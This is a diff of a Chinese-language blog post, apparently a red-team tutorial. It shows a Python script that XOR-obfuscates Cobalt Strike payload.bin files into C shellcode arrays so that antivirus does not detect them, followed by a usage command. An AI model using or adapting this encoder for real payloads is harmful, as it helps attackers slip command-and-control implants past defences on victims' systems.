@@ -96,51 +96,51 @@
 <p>C文件给出的是一个C语言中的字符数组，也是可以通过以字节单位操作的。</p>
 <h2 id="0x05-组合">0x05 组合</h2>
 <p>由于反病毒软件对于默认生成的文件查杀较为严格，我通常会采用混淆、加密解密的方式把载荷还原。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
-<span style="color:#f92672">from</span> argparse <span style="color:#f92672">import</span> ArgumentParser, FileType
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">process_bin</span>(num, src_fp, dst_fp, dst_raw):
-    shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-    shellcode_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-    shellcode_raw <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
-    <span style="color:#66d9ef">try</span>:
-        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
-            code <span style="color:#f92672">=</span> src_fp<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">1</span>)
-            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> code:
-                <span style="color:#66d9ef">break</span>
-
-            base10 <span style="color:#f92672">=</span> ord(code) <span style="color:#f92672">^</span> num
-            base10_str <span style="color:#f92672">=</span> chr(base10)
-            shellcode_raw <span style="color:#f92672">+=</span> base10_str<span style="color:#f92672">.</span>encode()
-            code_hex <span style="color:#f92672">=</span> hex(base10)
-            code_hex <span style="color:#f92672">=</span> code_hex<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;0x&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)
-            <span style="color:#66d9ef">if</span>(len(code_hex) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>):
-                code_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">+</span> code_hex
-            shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#39;</span> <span style="color:#f92672">+</span> code_hex
-            shellcode_size <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
-        src_fp<span style="color:#f92672">.</span>close()
-        dst_raw<span style="color:#f92672">.</span>write(shellcode_raw)
-        dst_raw<span style="color:#f92672">.</span>close()
-        dst_fp<span style="color:#f92672">.</span>write(shellcode)
-        dst_fp<span style="color:#f92672">.</span>close()
-        <span style="color:#66d9ef">return</span> shellcode_size
-    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
-        sys<span style="color:#f92672">.</span>stderr<span style="color:#f92672">.</span>writelines(str(e))
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
-    parser <span style="color:#f92672">=</span> ArgumentParser(prog<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Shellcode X&#39;</span>, description<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;[XOR The Cobaltstrike PAYLOAD.BINs] </span><span style="color:#ae81ff">\t</span><span style="color:#e6db74"> &gt; Author: rvn0xsy@gmail.com&#39;</span>)
-    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-v&#39;</span>,<span style="color:#e6db74">&#39;--version&#39;</span>,nargs<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;?&#39;</span>)
-    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-s&#39;</span>,<span style="color:#e6db74">&#39;--src&#39;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;source bin file&#39;</span>,type<span style="color:#f92672">=</span>FileType(<span style="color:#e6db74">&#39;rb&#39;</span>), required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
-    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-d&#39;</span>,<span style="color:#e6db74">&#39;--dst&#39;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;destination shellcode file&#39;</span>,type<span style="color:#f92672">=</span>FileType(<span style="color:#e6db74">&#39;w+&#39;</span>),required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
-    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-n&#39;</span>,<span style="color:#e6db74">&#39;--num&#39;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;Confused number&#39;</span>,type<span style="color:#f92672">=</span>int, default<span style="color:#f92672">=</span><span style="color:#ae81ff">90</span>)
-    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-r&#39;</span>,<span style="color:#e6db74">&#39;--raw&#39;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;output bin file&#39;</span>, type<span style="color:#f92672">=</span>FileType(<span style="color:#e6db74">&#39;wb&#39;</span>), required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
-    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
-    shellcode_size <span style="color:#f92672">=</span> process_bin(args<span style="color:#f92672">.</span>num, args<span style="color:#f92672">.</span>src, args<span style="color:#f92672">.</span>dst, args<span style="color:#f92672">.</span>raw)
-    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>writelines(<span style="color:#e6db74">&#34;[+]Shellcode Size : </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(shellcode_size))
-
-<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
-    main()
-</code></pre></div><p>上面这个脚本是我在去年写的，用于把raw文件混淆，生成c语言数组，在后面的文章中，我们也以c/c++语言为主，探究其本质。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> argparse <span style="color:#f92672">import</span> ArgumentParser, FileType
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">process_bin</span>(num, src_fp, dst_fp, dst_raw):
+</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    shellcode_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    shellcode_raw <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>            code <span style="color:#f92672">=</span> src_fp<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> code:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            base10 <span style="color:#f92672">=</span> ord(code) <span style="color:#f92672">^</span> num
+</span></span><span style="display:flex;"><span>            base10_str <span style="color:#f92672">=</span> chr(base10)
+</span></span><span style="display:flex;"><span>            shellcode_raw <span style="color:#f92672">+=</span> base10_str<span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>            code_hex <span style="color:#f92672">=</span> hex(base10)
+</span></span><span style="display:flex;"><span>            code_hex <span style="color:#f92672">=</span> code_hex<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;0x&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(len(code_hex) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>                code_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">+</span> code_hex
+</span></span><span style="display:flex;"><span>            shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#39;</span> <span style="color:#f92672">+</span> code_hex
+</span></span><span style="display:flex;"><span>            shellcode_size <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        src_fp<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>        dst_raw<span style="color:#f92672">.</span>write(shellcode_raw)
+</span></span><span style="display:flex;"><span>        dst_raw<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>        dst_fp<span style="color:#f92672">.</span>write(shellcode)
+</span></span><span style="display:flex;"><span>        dst_fp<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> shellcode_size
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>stderr<span style="color:#f92672">.</span>writelines(str(e))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> ArgumentParser(prog<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Shellcode X&#39;</span>, description<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;[XOR The Cobaltstrike PAYLOAD.BINs] </span><span style="color:#ae81ff">\t</span><span style="color:#e6db74"> &gt; Author: rvn0xsy@gmail.com&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-v&#39;</span>,<span style="color:#e6db74">&#39;--version&#39;</span>,nargs<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;?&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-s&#39;</span>,<span style="color:#e6db74">&#39;--src&#39;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;source bin file&#39;</span>,type<span style="color:#f92672">=</span>FileType(<span style="color:#e6db74">&#39;rb&#39;</span>), required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-d&#39;</span>,<span style="color:#e6db74">&#39;--dst&#39;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;destination shellcode file&#39;</span>,type<span style="color:#f92672">=</span>FileType(<span style="color:#e6db74">&#39;w+&#39;</span>),required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-n&#39;</span>,<span style="color:#e6db74">&#39;--num&#39;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;Confused number&#39;</span>,type<span style="color:#f92672">=</span>int, default<span style="color:#f92672">=</span><span style="color:#ae81ff">90</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-r&#39;</span>,<span style="color:#e6db74">&#39;--raw&#39;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;output bin file&#39;</span>, type<span style="color:#f92672">=</span>FileType(<span style="color:#e6db74">&#39;wb&#39;</span>), required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>    shellcode_size <span style="color:#f92672">=</span> process_bin(args<span style="color:#f92672">.</span>num, args<span style="color:#f92672">.</span>src, args<span style="color:#f92672">.</span>dst, args<span style="color:#f92672">.</span>raw)
+</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>writelines(<span style="color:#e6db74">&#34;[+]Shellcode Size : </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(shellcode_size))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>上面这个脚本是我在去年写的，用于把raw文件混淆，生成c语言数组，在后面的文章中，我们也以c/c++语言为主，探究其本质。</p>
 <h3 id="混淆方案">混淆方案</h3>
 <p>先生成bin文件，然后运行python脚本：</p>
 <pre tabindex="0"><code>python3 .\xor_shellcoder.py -s .\payload.bin  -d payload.c -n 10 -r out.bin
